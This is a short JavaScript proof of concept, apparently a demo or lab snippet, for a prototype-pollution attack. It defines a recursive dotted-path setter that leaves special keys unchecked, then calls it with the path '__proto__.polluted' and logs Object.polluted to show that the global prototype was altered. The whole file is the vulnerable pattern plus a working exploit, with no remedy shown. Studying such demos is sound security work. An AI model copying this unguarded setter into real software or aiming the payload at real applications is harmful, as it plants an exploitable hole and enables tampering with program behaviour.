function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}

function setValue(file, filename, rename) {
  const keylist = filename.split('.');
  const e = keylist.shift();
  console.log(e);
  if (keylist.length > 0) {
    if (!isObject(file[e])) file[e] = {};
    setValue(file[e], keylist.join('.'), rename);
  } else {
    file[filename] = rename;
    console.log(rename);
    return file;
  }
}

const file = {};
setValue(file, "__proto__.polluted", 'polluted.txt');

console.log(Object.polluted);
